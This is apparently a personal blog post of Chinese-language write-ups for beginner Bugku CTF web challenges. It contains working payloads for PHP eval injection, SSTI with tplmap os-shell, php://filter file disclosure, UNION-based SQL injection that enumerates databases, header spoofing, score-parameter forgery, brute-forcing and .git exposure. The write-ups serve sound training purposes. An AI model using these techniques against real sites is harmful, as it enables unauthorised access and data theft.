<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="题目非常适合新手">
<meta property="og:type" content="article">
<meta property="og:title" content="BugkuWeb题目">
<meta property="og:url" content="https://n9-zqc.github.io/2022/04/24/BugkuWeb%E9%A2%98%E7%9B%AE/index.html">
<meta property="og:site_name" content="N9-zqc">
<meta property="og:description" content="题目非常适合新手">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-04-23T16:03:39.000Z">
<meta property="article:modified_time" content="2022-05-08T02:57:40.110Z">
<meta property="article:author" content="N9-zqc">
<meta property="article:tag" content="bugku大多数web题目，剩下的能力提高了">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://n9-zqc.github.io/2022/04/24/BugkuWeb%E9%A2%98%E7%9B%AE/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>BugkuWeb题目 | N9-zqc</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">N9-zqc</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">有关网络安全的学习笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-文章">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>文章</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-查找">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>查找</a>

  </li>
        <li class="menu-item menu-item-关于">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/04/24/BugkuWeb%E9%A2%98%E7%9B%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="N9-zqc">
      <meta itemprop="description" content="主要有关ctf的学习笔记,主攻逆向和Web">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N9-zqc">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BugkuWeb题目
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-24 00:03:39" itemprop="dateCreated datePublished" datetime="2022-04-24T00:03:39+08:00">2022-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-08 10:57:40" itemprop="dateModified" datetime="2022-05-08T10:57:40+08:00">2022-05-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">ctf比赛</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>题目非常适合新手</p>
<span id="more"></span>

<h3 id="Bugku-web-类型90-的题目，剩下的难的决定再找时间更新。"><a href="#Bugku-web-类型90-的题目，剩下的难的决定再找时间更新。" class="headerlink" title="Bugku web 类型90%的题目，剩下的难的决定再找时间更新。"></a>Bugku web 类型90%的题目，剩下的难的决定再找时间更新。</h3><h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><h5 id="考察flask"><a href="#考察flask" class="headerlink" title="考察flask"></a>考察flask</h5><p>提示我们在flask里，经常设置一个secret_key变量，这里就得讲一下了，首先是Jinjan2 基础语法<br>分为三种：</p>
<p>{ %  …  % }</p>



<p>不过一般做题大部分都是第二种，因为这道题提示了是SSTI，所以也就不用判断了，一般情况下可以使用6，来判断会不会回显出 2x3 的值<br>其次是config的用法，config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值，所以可以使用 config.xxx 来查看该对象的属性值。(值需要大写)<br>所以，这道题最后的payload就是</p>
<p><a target="_blank" rel="noopener" href="http://114.67.246.176:10460/?flag=">http://114.67.246.176:10460/?flag=</a></p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><h5 id="拼接引号闭合，print-r-file-“-flag-php”-打印文件"><a href="#拼接引号闭合，print-r-file-“-flag-php”-打印文件" class="headerlink" title="拼接引号闭合，print_r(file(“./flag.php”));打印文件"></a>拼接引号闭合，print_r(file(“./flag.php”));打印文件</h5><p>eval( “var_dump($a);”); //拼接使用’’);’’拼接，print_r(file(“./flag.php”));打印文件，以及//注释</p>
<p>payload：[114.67.175.224:12781/?hello= 1);print_r(file(“flag.php”));//](<a target="_blank" rel="noopener" href="http://114.67.175.224:12781/?hello=">http://114.67.175.224:12781/?hello=</a> 1);print_r(file(“flag.php”));//)</p>
<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><h5 id="1-使用御剑后台扫描工具发现"><a href="#1-使用御剑后台扫描工具发现" class="headerlink" title="1.使用御剑后台扫描工具发现"></a>1.使用御剑后台扫描工具发现</h5><h5 id="http-114-67-175-224-17941-shell-php是一个后台登陆"><a href="#http-114-67-175-224-17941-shell-php是一个后台登陆" class="headerlink" title="http://114.67.175.224:17941/shell.php是一个后台登陆"></a><a target="_blank" rel="noopener" href="http://114.67.175.224:17941/shell.php%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86">http://114.67.175.224:17941/shell.php是一个后台登陆</a></h5><h5 id="2-使用burpsuite爆破密码"><a href="#2-使用burpsuite爆破密码" class="headerlink" title="2.使用burpsuite爆破密码"></a>2.使用burpsuite爆破密码</h5><p>发现密码是hack，登陆即可得到flag</p>
<h4 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h4><h5 id="1-查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。"><a href="#1-查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。" class="headerlink" title="1.查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。"></a>1.查看源代码，发现base64，为test123，使用admin登陆，提示本地管理员。</h5><h5 id="2-构造X-Forwarded-For-127-0-0-1，再次登录成功得到flag。"><a href="#2-构造X-Forwarded-For-127-0-0-1，再次登录成功得到flag。" class="headerlink" title="2.构造X-Forwarded-For: 127.0.0.1，再次登录成功得到flag。"></a>2.构造X-Forwarded-For: 127.0.0.1，再次登录成功得到flag。</h5><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><p>flag In the variable ! &lt;?php</p>
<p>error_reporting(0);<br>include “flag1.php”;<br>highlight_file(<strong>file</strong>);<br>if(isset($_GET[‘args’])){<br>$args = $_GET[‘args’];<br>if(!preg_match(“/^\w+$/“,$args)){   //正则匹配所有数字字母下划线<br>die(“args error!”);<br>}<br>eval(“var_dump($$args);”);<br>}<br>?&gt;</p>
<p>抓住两个地方，一个是正则表达式匹配，不匹配则直接die，该正则表达式应该是匹配都是字母的串。然后最关键的是最后的$$args,这是可变变量的意思，如$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名，那么PHP的九大全局变量，一个一个试。</p>
<ul>
<li>$_POST [用于接收post提交的数据]</li>
<li>$_GET [用于获取url地址栏的参数数据]</li>
<li>$_FILES [用于文件就收的处理img 最常见]</li>
<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>
<li>$_SESSION [用于存储session的值或获取session中的值]</li>
<li>$_REQUEST [具有get,post的功能，但比较慢]</li>
<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>
<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>
<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>
</ul>
<p>当args=GLOBALS时，flag出现。</p>
<p>array(7) { [“GLOBALS”]=&gt; <em>RECURSION</em> [“_POST”]=&gt; array(0) { } [“_GET”]=&gt; array(1) { [“args”]=&gt; string(7) “GLOBALS” } [“_COOKIE”]=&gt; array(0) { } [“_FILES”]=&gt; array(0) { } [“ZFkwe3”]=&gt; string(38) “flag{92853051ab894a64f7865cf3c2128b34}” [“args”]=&gt; string(7) “GLOBALS” }</p>
<h4 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h4><h5 id="1-学习网址-SSTI（模板注入）漏洞（入门篇）-bmjoker-博客园-cnblogs-com"><a href="#1-学习网址-SSTI（模板注入）漏洞（入门篇）-bmjoker-博客园-cnblogs-com" class="headerlink" title="1.学习网址 SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1.学习网址 SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></h5><p>使用的是python中的Jinja2模板注入</p>
<h5 id="2-使用tplmap"><a href="#2-使用tplmap" class="headerlink" title="2.使用tplmap"></a>2.使用tplmap</h5><p>python tplmap.py -u <a target="_blank" rel="noopener" href="http://114.67.175.224:17061/?flag=1">http://114.67.175.224:17061/?flag=1</a> –os-shell</p>
<p>cat flag即可得到flag</p>
<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><h5 id="1查看源代码"><a href="#1查看源代码" class="headerlink" title="1查看源代码"></a>1查看源代码</h5><p> var p1 = ‘%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’; var p2 = ‘%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’; eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));</p>
<h5 id="2-使用url解码"><a href="#2-使用url解码" class="headerlink" title="2.使用url解码"></a>2.使用url解码</h5><p>var p1 = ‘function checkSubmit(){var a=document.getElementById(“password”);if(“undefined”!=typeof a){if(“67d709b2b’;</p>
<p>var p2 = ‘aa648cf6e87a7114f1”==a.value)return!0;alert(“Error”);a.focus();return!1}}document.getElementById(“levelQuest”).onsubmit=checkSubmit;’;<br>eval(unescape(p1)   unescape(‘54aa2’   p2));</p>
<h5 id="3-输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag"><a href="#3-输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag" class="headerlink" title="3.输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag"></a>3.输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag</h5><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><h6 id="构造利用php-filter"><a href="#构造利用php-filter" class="headerlink" title="构造利用php://filter"></a>构造利用php://filter</h6><p>  利用php流filter返回base64加密后的php源代码，如下代码和截图所示，我们可以利用php的filter机制来得到我们想要的php源代码。这里假设源代码文件为index.php，且在网站根目录下，构造payload会获取到对应代码的base64编码，然后再解密即可<br>即?file=php://filter/convert.base64-encode/resource=index</p>
<p><a target="_blank" rel="noopener" href="http://114.67.175.224:13308/index.php?file=php://filter/convert.base64-encode/resource=index.php">Bugku-web</a></p>
<p>再base64解码即可得到flag</p>
<h4 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h4><h5 id="用burp爆破密码，线程数设置成50。可以得到密码12468"><a href="#用burp爆破密码，线程数设置成50。可以得到密码12468" class="headerlink" title="用burp爆破密码，线程数设置成50。可以得到密码12468"></a>用burp爆破密码，线程数设置成50。可以得到密码12468</h5><h4 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h4><h5 id="1-在图片中写入在上传"><a href="#1-在图片中写入在上传" class="headerlink" title="1.在图片中写入在上传"></a>1.在图片中写入在上传</h5><p>import os<br>os.system(‘find /* |grep flag’)<br>os.system(‘cat /flag’)</p>
<h5 id="2-查看网页源代码即可得到flag"><a href="#2-查看网页源代码即可得到flag" class="headerlink" title="2.查看网页源代码即可得到flag"></a>2.查看网页源代码即可得到flag</h5><h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><h5 id="1-使用网址后面加index-php-bak获得php的源代码"><a href="#1-使用网址后面加index-php-bak获得php的源代码" class="headerlink" title="1.使用网址后面加index.php.bak获得php的源代码"></a>1.使用网址后面加index.php.bak获得php的源代码</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"></span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: <span class="number">2017</span>/<span class="number">8</span>/<span class="number">6</span></span><br><span class="line"> * Time: <span class="number">20</span>:<span class="number">22</span></span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">include_once <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$<span class="built_in">str</span> = strstr($_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  //得到网址?以及后面的字符串</span><br><span class="line">$<span class="built_in">str</span> = substr($<span class="built_in">str</span>,<span class="number">1</span>);           	//从第一个字符开始取</span><br><span class="line">$<span class="built_in">str</span> = str_replace(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$<span class="built_in">str</span>);  //将key换为空  双写绕过</span><br><span class="line">parse_str($<span class="built_in">str</span>);       //key1[]=<span class="number">1</span>&amp;key2[]=<span class="number">2</span> 会转换为</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [key1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [key2] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">2</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;  //md5过滤 数组绕过</span><br><span class="line">    echo $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="114-67-175-224-17086-kekeyy1-1-amp-kekeyy2-2"><a href="#114-67-175-224-17086-kekeyy1-1-amp-kekeyy2-2" class="headerlink" title="[114.67.175.224:17086/?kekeyy1]=1&amp;kekeyy2[]=2"></a>[114.67.175.224:17086/?kekeyy1<a target="_blank" rel="noopener" href="http://114.67.175.224:17086/?kekeyy1%5B%5D=1&kekeyy2%5B%5D=2">]=1&amp;kekeyy2[]=2</a></h5><p>构造?kekeyy1[]=1&amp;kekeyy2[]=2</p>
<h4 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h4><h5 id="1-玩完游戏抓包可以得到："><a href="#1-玩完游戏抓包可以得到：" class="headerlink" title="1.玩完游戏抓包可以得到："></a>1.玩完游戏抓包可以得到：</h5><p>GET /score.php?score=100&amp;ip=111.37.4.192&amp;sign=zMMTAw== HTTP/1.1  得分为100</p>
<p>GET /score.php?score=50&amp;ip=111.37.4.192&amp;sign=zMNTA=== HTTP/1.1      得分为50</p>
<h5 id="2-查找score-php在源代码里"><a href="#2-查找score-php在源代码里" class="headerlink" title="2.查找score.php在源代码里"></a>2.查找score.php在源代码里</h5><table>
<thead>
<tr>
<th align="left"></th>
<th>var ppp=’111.37.4.192’;</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td>var sign = Base64.encode(score.toString());</td>
</tr>
<tr>
<td align="left"></td>
<td>xmlhttp.open(“GET”,”score.php?score=”+score+”&amp;ip=”+ppp+”&amp;sign=”+sign,true);</td>
</tr>
<tr>
<td align="left"></td>
<td>xmlhttp.send();</td>
</tr>
</tbody></table>
<h5 id="3-找到规律为sign-’zM’-base64-score-’-’"><a href="#3-找到规律为sign-’zM’-base64-score-’-’" class="headerlink" title="3.找到规律为sign=’zM’+base64(score)+’==’"></a>3.找到规律为sign=’zM’+base64(score)+’==’</h5><p>直接提交一个大的分数<a target="_blank" rel="noopener" href="http://114.67.175.224:16128//score.php?score=10000&ip=111.37.4.192&sign=zMMTAwMDA===">114.67.175.224:16128//score.php?score=10000&amp;ip=111.37.4.192&amp;sign=zMMTAwMDA===</a></p>
<p>即可得到flag</p>
<h4 id="成绩查询-一个非常好的联合注入实战题目-强烈推荐-建议永久收藏"><a href="#成绩查询-一个非常好的联合注入实战题目-强烈推荐-建议永久收藏" class="headerlink" title="成绩查询(一个非常好的联合注入实战题目 强烈推荐 建议永久收藏)"></a>成绩查询(一个非常好的联合注入实战题目 强烈推荐 建议永久收藏)</h4><h5 id="注意联合注入时前式必须返回为空"><a href="#注意联合注入时前式必须返回为空" class="headerlink" title="注意联合注入时前式必须返回为空"></a>注意联合注入时前式必须返回为空</h5><p>然后尝试获取列数，因为已经有名字和三科成绩了，所以就测试4或者更高，得知是4列 </p>
<h5 id="因为构造id-1’-order-by-5-时，没有正常回显，id-1’-order-by-4-时，正常回显，所以判断有4列"><a href="#因为构造id-1’-order-by-5-时，没有正常回显，id-1’-order-by-4-时，正常回显，所以判断有4列" class="headerlink" title="因为构造id=1’ order by 5#时，没有正常回显，id=1’ order by 4#时，正常回显，所以判断有4列"></a>因为构造id=1’ order by 5#时，没有正常回显，id=1’ order by 4#时，正常回显，所以判断有4列</h5><p>1’ order by 4#  //有数据说明有4列</p>
<h5 id="1-用联合查询进行注入则：页面必须有显示位。-2-union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同"><a href="#1-用联合查询进行注入则：页面必须有显示位。-2-union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同" class="headerlink" title="1.用联合查询进行注入则：页面必须有显示位。 2.union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同"></a>1.用联合查询进行注入则：页面必须有显示位。 2.union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同</h5><p>0’ union select 11,22,33,SCHEMA_NAME from information_schema.SCHEMATA#  //返回information_schema 返回一个数据库名</p>
<p>0’ union select 1,2,3,(select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA)#  //返回 information_schema,mysql,skctf,test   group_concat()一次性显示，即返回所有的数据库名</p>
<p>0’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’information_schema’)# 返回CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS</p>
<p>0’ union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’skctf’)# 返回 fl4g,sc</p>
<p>-1’ union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_schema=’skctf’ and table_name=’fl4g’)# 返回 skctf_flag</p>
<p>-1’ union select 1,2,3,(select skctf_flag from fl4g)# 即可得到flag</p>
<p>-1’ union select 1,2,3,(select user())#   #返回root@localhost 说明是root用户</p>
<p>-1’ UNION SELECT 1,2,database(),user()# skctf  root@localhost 说明当前数据库名称是 skctf</p>
<p>通过以上命令就可以得到所有有关这个数据库的所有信息</p>
<h4 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h4><h5 id="1-a2V5cy50eHQ-是keys-php，修改index-php的base64为filename，可以获得php的源代码。"><a href="#1-a2V5cy50eHQ-是keys-php，修改index-php的base64为filename，可以获得php的源代码。" class="headerlink" title="1.a2V5cy50eHQ= 是keys.php，修改index.php的base64为filename，可以获得php的源代码。"></a>1.a2V5cy50eHQ= 是keys.php，修改index.php的base64为filename，可以获得php的源代码。</h5><p>用python写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">&quot;http://114.67.175.224:14233/index.php?line=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<!--?php

error_reporting(0);

$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',

);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}

if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?>

##### 2.根据源代码可知需构造

GET /index.php?line=0&filename=a2V5cy5waHA= HTTP/1.1   //文件时keys.php

Cookie: margin=margin;  //发送即可得到flag

#### bp

##### 根据题目密码时6位，z开头，且是top1000弱密码

搜索查找可以得到密码zxc123，输入即可得到flag。或者使用python筛选，再用bp爆破。

#### source

##### 1.打开发现什么也没有，猜测使用目录扫描，用御剑扫描什么也扫不出来，那就用kali自带的dirbuster扫描，30线程数，选择/usr/share/wordlists/dirb/common.txt文件，选择auto switch(Head and get) ,list based brute force,urlfuzz,填上/.{dir}开始扫描。

Starting OWASP DirBuster 1.0-RC1
Starting URL fuzz
Starting fuzz on http://114.67.175.224:18239/.{dir}
Dir found: /. - 200
Dir found: /.git - 301
Dir found: /.htdig - 403
Dir found: /.hta - 403
Dir found: /.html - 403
Dir found: /.htdoc - 403
Dir found: /.htmls - 403
Dir found: /.htdocs - 403
Dir found: /.htbin - 403
Dir found: /.htm - 403
Dir found: /.ht - 403
Dir found: /.htpasswd - 403
Dir found: /.httpd - 403
Dir found: /.httpdocs - 403
Dir found: /.httpmodules - 403
Dir found: /.http - 403
Dir found: /.httpuser - 403
Dir found: /.https - 403
Dir found: /.htmlarea - 403
Dir found: /.php - 403
Dir found: /.phps - 403
Dir found: /.phtml - 403

##### 2.301重定向，403拒绝访问，因此找到。git文件。

**使用wget -r http://114.67.246.176:14508/.git下载文件**

**查找目录下的所有文件中是否含有某个字符串**** 
**find .|xargs grep -ri "IBM"** 
**查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名** 
**find .|xargs grep -ri "IBM" -l**** 

###### git reflog命令：可以叫做显示可引用的历史版本记录

d256328 HEAD@{0}: reset: moving to d25632
13ce8d0 HEAD@{1}: commit: flag is here?
fdce35e HEAD@{2}: reset: moving to fdce35e
e0b8e8e HEAD@{3}: reset: moving to e0b8e
40c6d51 HEAD@{4}: commit: flag is here?
fdce35e HEAD@{5}: commit: flag is here?
d256328 HEAD@{6}: commit: flag is here?
